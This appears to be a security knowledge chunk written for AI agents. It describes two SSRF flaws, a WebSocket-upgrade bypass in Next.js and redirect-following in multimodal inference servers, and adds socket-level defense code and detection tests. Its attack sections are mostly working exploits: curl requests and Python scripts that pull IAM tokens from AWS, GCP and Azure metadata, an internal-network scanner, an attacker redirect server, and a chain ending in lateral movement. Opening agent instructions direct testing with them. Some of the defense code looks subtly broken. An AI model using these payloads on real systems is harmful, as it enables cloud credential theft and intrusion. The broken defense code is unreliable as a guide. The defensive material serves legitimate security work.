# WebSocket Upgrade SSRF, AI Multimodal SSRF & Socket-Level Defense — Agent Chunk 17b
> Source: Deep Internet Research 2026 (Adversarially Verified)
> Purpose: Understand two new SSRF vector classes — WebSocket upgrade requests bypassing HTTP safety checks, and AI multimodal input SSRF via redirect TOCTOU — plus the definitive socket-level defense pattern
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing for SSRF, extend beyond standard URL manipulation. Test WebSocket upgrade requests (Connection:Upgrade + Upgrade:websocket) which bypass HTTP-level SSRF protections because security tools skip inspection of upgrade requests. Test AI/ML endpoints with multimodal inputs (image_url, audio_url, file_url) for redirect-based SSRF where initial URL validation passes but a 302 redirect leads to internal metadata endpoints. Verify that SSRF defenses validate at the socket level (getpeername() after connect, before TLS) rather than at the DNS level, which is vulnerable to DNS rebinding. The AI multimodal attack surface is rapidly expanding.

---

## 1. WebSocket Upgrade SSRF (CVE-2026-44578)

### 1.1 Vulnerability Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2026-44578 |
| CVSS | 8.6 (High, Scope Changed) |
| Affected | Next.js 13.4.13-15.5.15, 16.0.0-16.2.4 (self-hosted only) |
| Class | CWE-918 (Server-Side Request Forgery) |

WebSocket upgrade requests are NOT subjected to the same HTTP safety checks applied to standard HTTP requests. When `Connection: Upgrade` and `Upgrade: websocket` headers are present, security middleware and SSRF protections skip inspection, allowing requests to reach internal services including cloud metadata endpoints.

### 1.2 Root Cause Analysis

Next.js's built-in Node.js server handles WebSocket upgrade requests through a separate code path that bypasses the HTTP request processing pipeline where SSRF protections (private IP blocking, URL allowlisting) are enforced.

```javascript
// Simplified Next.js request handling (vulnerable)
const server = http.createServer((req, res) => {
    // HTTP requests go through full security pipeline
    if (isSSRFBlocked(req.url)) {
        return res.writeHead(403).end('Blocked');
    }
    handleHTTPRequest(req, res);
});

server.on('upgrade', (req, socket, head) => {
    // WebSocket upgrade requests BYPASS the security pipeline
    // No SSRF checks applied here
    const targetUrl = extractDestination(req);
    
    // Direct proxy to target — no private IP check
    const upstream = http.request(targetUrl, { method: 'GET' });
    upstream.on('response', (proxyRes) => {
        socket.write(formatResponse(proxyRes));
    });
    upstream.end();
});
```

The `upgrade` event handler operates outside the standard request pipeline. Security middleware registered via `createServer` callback never sees upgrade requests.

### 1.3 Exploitation

**Direct metadata access via WebSocket upgrade:**
```bash
# SSRF to AWS metadata via WebSocket upgrade headers
curl -i -N \
  -H 'Connection: Upgrade' \
  -H 'Upgrade: websocket' \
  'http://target.example.com/_next/webpack-hmr?destination=http://169.254.169.254/latest/meta-data/'

# Expected: Response contains AWS metadata (instance-id, IAM role, etc.)
```

**Targeting specific metadata endpoints:**
```bash
# AWS IAM credentials
curl -i -N \
  -H 'Connection: Upgrade' \
  -H 'Upgrade: websocket' \
  'http://target.example.com/_next/webpack-hmr?destination=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# GCP metadata
curl -i -N \
  -H 'Connection: Upgrade' \
  -H 'Upgrade: websocket' \
  -H 'Metadata-Flavor: Google' \
  'http://target.example.com/_next/webpack-hmr?destination=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'

# Azure metadata
curl -i -N \
  -H 'Connection: Upgrade' \
  -H 'Upgrade: websocket' \
  -H 'Metadata: true' \
  'http://target.example.com/_next/webpack-hmr?destination=http://169.254.169.254/metadata/instance?api-version=2021-02-01'
```

**Scanning internal network:**
```python
import requests

def ssrf_via_upgrade(target, internal_url):
    """Exploit WebSocket upgrade SSRF to reach internal services."""
    headers = {
        'Connection': 'Upgrade',
        'Upgrade': 'websocket',
    }
    
    resp = requests.get(
        f"http://{target}/_next/webpack-hmr",
        params={"destination": internal_url},
        headers=headers,
        timeout=5
    )
    return resp

# Scan common internal endpoints
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.1:8080/admin",
    "http://consul.service.consul:8500/v1/agent/self",
    "http://vault.service.consul:8200/v1/sys/health",
    "http://kubernetes.default.svc:443/api/v1/namespaces",
    "http://localhost:6379/INFO",        # Redis
    "http://localhost:9200/_cluster/health",  # Elasticsearch
]

for url in internal_targets:
    try:
        resp = ssrf_via_upgrade("target.example.com", url)
        if resp.status_code == 200:
            print(f"INTERNAL ACCESS: {url}")
            print(f"  Response: {resp.text[:200]}")
    except Exception as e:
        print(f"  {url}: {e}")
```

### 1.4 Chaining

```
WebSocket upgrade SSRF
    -> Cloud metadata endpoint (169.254.169.254)
    -> IAM credentials exfiltration
    -> S3 bucket access with stolen credentials
    -> RDS database access via IAM auth
    -> Lateral movement across cloud infrastructure
```

### 1.5 Reproduction Steps

1. Identify target running self-hosted Next.js (versions 13.4.13-15.5.15 or 16.0.0-16.2.4) with built-in Node.js server
2. Send request to `/_next/webpack-hmr` with `Connection: Upgrade` and `Upgrade: websocket` headers
3. Include `destination` parameter pointing to `http://169.254.169.254/latest/meta-data/`
4. Security middleware skips inspection due to upgrade headers
5. Server proxies request to metadata endpoint
6. Cloud credentials returned in response

---

## 2. AI Multimodal Input SSRF via Redirect (CVE-2026-63764)

### 2.1 Vulnerability Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2026-63764 |
| CVSS | v4.0 9.2 (Critical) |
| Affected | LMDeploy and similar OpenAI-compatible inference servers |
| Class | CWE-918 (SSRF) + CWE-367 (TOCTOU Race Condition) |

OpenAI-compatible multimodal endpoints accept `image_url`, `audio_url`, and `file_url` fields. The `_load_http_url` function validates the original URL (public domain passes) but follows HTTP 302 redirects to internal metadata endpoints without re-validating the redirect target. This is a validate-then-request TOCTOU pattern.

### 2.2 Root Cause Analysis

```python
# Simplified LMDeploy _load_http_url (vulnerable)
def _load_http_url(url: str) -> bytes:
    """Load content from HTTP URL for multimodal processing."""
    
    # Step 1: Validate original URL — checks for private IPs
    parsed = urlparse(url)
    resolved_ip = socket.gethostbyname(parsed.hostname)
    
    if ipaddress.ip_address(resolved_ip).is_private:
        raise ValueError(f"Private IP blocked: {resolved_ip}")
    
    # Step 2: Fetch content — follows redirects automatically
    # BUG: No re-validation after redirect
    response = requests.get(url, allow_redirects=True, timeout=30)
    #                             ^^^^^^^^^^^^^^^^
    # 302 redirect to http://169.254.169.254 is followed
    # without checking if the REDIRECT TARGET is a private IP
    
    return response.content
```

The TOCTOU gap: URL is validated at step 1, but the actual request at step 2 may go to a completely different destination via redirect. The redirect target is never validated.

### 2.3 Exploitation

**Step 1: Set up redirect server.**

```python
# attacker-server.py — redirect to cloud metadata
from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Redirect to AWS metadata endpoint
        self.send_response(302)
        self.send_header(
            'Location', 
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        )
        self.end_headers()
    
    def log_message(self, format, *args):
        print(f"Redirect request from: {self.client_address[0]}")

HTTPServer(('0.0.0.0', 8080), RedirectHandler).serve_forever()
```

**Step 2: Send multimodal request with redirect URL.**

```bash
curl -X POST http://target-lmdeploy.example.com/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "llava-v1.5-7b",
    "messages": [
      {
        "role": "user",
        "content": [
          {
            "type": "image_url",
            "image_url": {
              "url": "http://attacker-server.com:8080/redirect.jpg"
            }
          },
          {
            "type": "text",
            "text": "Describe this image"
          }
        ]
      }
    ]
  }'
```

**What happens:**
1. Server validates `attacker-server.com:8080` — public IP, passes check
2. Server sends GET to `http://attacker-server.com:8080/redirect.jpg`
3. Attacker server responds with `302` redirect to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. Server follows redirect to metadata endpoint — no re-validation
5. Cloud credentials fetched and processed as "image data"
6. Credentials may appear in error messages, logs, or model output

**Targeting different cloud providers:**
```python
redirect_targets = {
    "aws_metadata": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_userdata": "http://169.254.169.254/latest/user-data",
    "gcp_token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "azure_token": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "k8s_token": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
}

# Test each with the multimodal SSRF
for name, target in redirect_targets.items():
    setup_redirect(target)
    result = send_multimodal_request(image_url="http://attacker.com/redirect.jpg")
    print(f"{name}: {result.status_code}")
```

### 2.4 Expanding Attack Surface

This is an EXPANDING attack surface as more applications deploy multimodal AI inference. Any OpenAI-compatible API that accepts URL-based media inputs is potentially vulnerable:

- `image_url` in vision/multimodal models
- `audio_url` in speech-to-text endpoints  
- `file_url` in document processing endpoints
- `video_url` in video understanding models
- Custom `url` fields in tool-use/function-calling responses

### 2.5 Reproduction Steps

1. Set up an attacker-controlled server that responds with HTTP 302 redirect to `http://169.254.169.254/latest/meta-data/`
2. Send POST to `/v1/chat/completions` with `image_url` pointing to the attacker redirect server
3. Server validates the original URL (public domain passes)
4. Server follows the 302 redirect to the metadata endpoint without re-validating
5. Cloud credentials or internal data exfiltrated

---

## 3. Socket-Level SSRF Defense (MLflow SSRFProtectedHTTPAdapter)

### 3.1 The Only Robust Defense Pattern

The MLflow `SSRFProtectedHTTPAdapter` implements the definitive SSRF defense: validation at the raw TCP socket level, after connect but before TLS handshake.

```python
import socket
import ipaddress
from requests.adapters import HTTPAdapter
from urllib3.util.connection import create_connection as _orig_create_connection

class SSRFProtectedHTTPAdapter(HTTPAdapter):
    """
    SSRF defense that validates the ACTUAL peer IP at the socket level.
    
    This defeats:
    - DNS rebinding (DNS resolves to public, then re-resolves to private)
    - HTTP redirects to internal IPs
    - URL parsing inconsistencies
    - TOCTOU between DNS resolution and connection
    """
    
    def send(self, request, **kwargs):
        # Create session with SSRF protections
        session = self._create_protected_session()
        return super().send(request, **kwargs)
    
    def _create_protected_session(self):
        original_create_connection = socket.create_connection
        
        def protected_create_connection(address, *args, **kwargs):
            # Step 1: Establish TCP connection normally
            sock = original_create_connection(address, *args, **kwargs)
            
            # Step 2: Get ACTUAL peer IP from the socket
            # This is the real IP, not what DNS said
            peer_ip, peer_port = sock.getpeername()
            
            # Step 3: Validate peer IP is globally routable
            ip = ipaddress.ip_address(peer_ip)
            
            if not ip.is_global:
                sock.close()
                raise ValueError(
                    f"SSRF blocked: peer IP {peer_ip} is not globally routable"
                )
            
            # Step 4: Also block CGNAT range (100.64.0.0/10)
            cgnat = ipaddress.ip_network('100.64.0.0/10')
            if ip in cgnat:
                sock.close()
                raise ValueError(
                    f"SSRF blocked: peer IP {peer_ip} is in CGNAT range"
                )
            
            return sock
        
        # Monkey-patch socket.create_connection
        socket.create_connection = protected_create_connection
```

### 3.2 Why Socket-Level Validation Is Superior

| Defense Layer | Defeated By |
|--------------|-------------|
| URL parsing | Parser inconsistencies, encoding tricks, Unicode |
| DNS resolution check | DNS rebinding (short TTL, dual A records) |
| IP blocklist on resolved address | TOCTOU between resolution and connection |
| HTTP-level redirect following | Redirect to different IP after initial check |
| **Socket getpeername()** | **Nothing — this IS the actual peer** |

**Key insight:** `getpeername()` returns the actual IP address of the connected peer. It does not matter what DNS returned, what URL was parsed, or what redirects were followed. The socket is connected to this IP, and that is what gets validated.

### 3.3 Complete Implementation

```python
import requests
import socket
import ipaddress

def create_ssrf_protected_session():
    """Create a requests session with socket-level SSRF protection."""
    
    session = requests.Session()
    
    # Disable trust_env to prevent proxy env vars from making
    # the proxy the validated peer instead of the actual target
    session.trust_env = False
    
    adapter = SSRFProtectedHTTPAdapter()
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    return session

# Usage in an AI multimodal endpoint
def load_image_url_safely(url: str) -> bytes:
    """Load image from URL with SSRF protection."""
    session = create_ssrf_protected_session()
    
    try:
        # allow_redirects=True is SAFE because socket-level
        # validation occurs on EVERY connection, including redirects
        response = session.get(url, allow_redirects=True, timeout=30)
        
        # Validate content type
        content_type = response.headers.get('Content-Type', '')
        if not content_type.startswith('image/'):
            raise ValueError(f"Not an image: {content_type}")
        
        return response.content
        
    except ValueError as e:
        # SSRF blocked or invalid content
        raise
```

### 3.4 Additional Defenses

```python
# Block additional dangerous ranges beyond is_global
ADDITIONAL_BLOCKED_RANGES = [
    ipaddress.ip_network('100.64.0.0/10'),    # CGNAT
    ipaddress.ip_network('169.254.0.0/16'),    # Link-local (AWS metadata)
    ipaddress.ip_network('fd00::/8'),          # IPv6 unique local
    ipaddress.ip_network('fe80::/10'),         # IPv6 link-local
    ipaddress.ip_network('::ffff:0:0/96'),     # IPv4-mapped IPv6
]

def is_safe_ip(ip_str: str) -> bool:
    """Check if IP is safe for outbound requests."""
    ip = ipaddress.ip_address(ip_str)
    
    if not ip.is_global:
        return False
    
    for blocked in ADDITIONAL_BLOCKED_RANGES:
        if ip in blocked:
            return False
    
    return True
```

---

## 4. Detection Methodology

### 4.1 WebSocket Upgrade SSRF Detection

```bash
# Test for WebSocket upgrade SSRF
# Use timing to detect if internal endpoints are reached
time curl -s -o /dev/null -w "%{http_code}" \
  -H 'Connection: Upgrade' \
  -H 'Upgrade: websocket' \
  "http://target.com/_next/webpack-hmr?destination=http://169.254.169.254/"

# If response is fast with 200, SSRF likely successful
# If response is slow (timeout) or 403, protections may be in place
```

### 4.2 Multimodal SSRF Detection

```python
# Test multimodal endpoints for redirect-following SSRF
def test_multimodal_ssrf(endpoint):
    """Test if AI endpoint follows redirects without re-validation."""
    
    # Set up canary redirect server
    canary_url = setup_canary_redirect("http://169.254.169.254/latest/meta-data/")
    
    payloads = [
        {"type": "image_url", "image_url": {"url": canary_url}},
        {"type": "audio_url", "audio_url": {"url": canary_url}},
        {"type": "file_url",  "file_url":  {"url": canary_url}},
    ]
    
    for payload in payloads:
        resp = requests.post(endpoint, json={
            "model": "test",
            "messages": [{"role": "user", "content": [payload]}]
        })
        
        if canary_was_hit():
            print(f"MULTIMODAL SSRF: {payload['type']} follows redirects")
```
